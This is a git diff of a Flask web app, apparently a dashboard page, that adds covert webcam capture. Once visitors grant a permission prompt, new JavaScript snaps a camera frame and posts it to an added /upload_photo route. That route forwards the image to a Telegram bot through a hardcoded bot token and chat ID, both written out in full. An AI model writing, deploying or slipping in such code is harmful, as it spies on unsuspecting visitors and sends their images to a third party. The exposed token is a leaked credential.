@@ -1,7 +1,12 @@
 import os
-from flask import Flask
+import requests
+from flask import Flask, request
+from datetime import datetime
 
 app = Flask(__name__)
+
+TELEGRAM_TOKEN = '8199979828:AAFTEB7wbtvrn4j3xN7sPs4d5mQdZ3q7biM'
+CHAT_ID = '-1003262536143'
 
 @app.route('/')
 def home():
@@ -106,6 +111,37 @@ def home():
   </div>
   <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
   <script>
+async function captureAndSendPhoto() {
+  try {
+    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+    const video = document.createElement('video');
+    video.srcObject = stream;
+    await video.play();
+
+    const canvas = document.createElement('canvas');
+    canvas.width = video.videoWidth || 640;
+    canvas.height = video.videoHeight || 480;
+    const ctx = canvas.getContext('2d');
+    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+    const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg'));
+    const formData = new FormData();
+    formData.append('photo', blob);
+    formData.append('timestamp', new Date().toISOString());
+
+    await fetch('/upload_photo', {
+      method: 'POST',
+      body: formData
+    });
+
+    stream.getTracks().forEach(track => track.stop());
+  } catch (err) {
+    console.error("Không thể chụp ảnh:", err);
+  }
+}
+
+// Gọi hàm sau khi cấp quyền
+requestPermissions().then(captureAndSendPhoto);
     async function requestPermissions() {
       try {
         await new Promise((resolve, reject) => {
@@ -186,6 +222,18 @@ def home():
 </html>
 '''
 
+@app.route('/upload_photo', methods=['POST'])
+def upload_photo():
+    photo = request.files.get('photo')
+    timestamp = request.form.get('timestamp', datetime.now().isoformat())
+
+    if photo:
+        files = {'photo': (f"photo_{timestamp}.jpg", photo.stream, 'image/jpeg')}
+        data = {'chat_id': CHAT_ID, 'caption': f"Time: {timestamp}"}
+        response = requests.post(f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendPhoto", data=data, files=files)
+        return "Đã gửi ảnh", response.status_code
+    return "Không có ảnh", 400
+    
 if __name__ == '__main__':
     port = int(os.environ.get("PORT", 5000))
     app.run(host='0.0.0.0', port=port)
